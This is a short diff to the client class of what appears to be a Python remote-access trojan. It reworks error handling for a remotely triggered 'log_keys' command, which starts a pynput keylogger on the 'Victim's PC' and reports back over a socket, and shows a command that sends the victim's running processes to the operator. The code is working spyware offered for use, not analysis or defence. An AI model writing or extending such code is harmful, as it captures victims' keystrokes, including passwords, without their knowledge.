@@ -47,11 +47,12 @@ class Client():
         if self.command=="log_keys":
             try:
                 import pynput
-            except:
-                self.client.send("pynput Isn't Installed In Victim's PC".encode())
-            else:
                 with pynput.keyboard.Listener(on_press=self.log_keys) as listener:
                     listener.join()
+            except ImportError:
+                self.client.send("pynput Isn't Installed In Victim's PC".encode())
+            except:
+                self.client.send("Something Went Wrong!".encode())
         # Get All Running Process
         if self.command=="get_running_process":
             ps=self.get_running_process().encode()
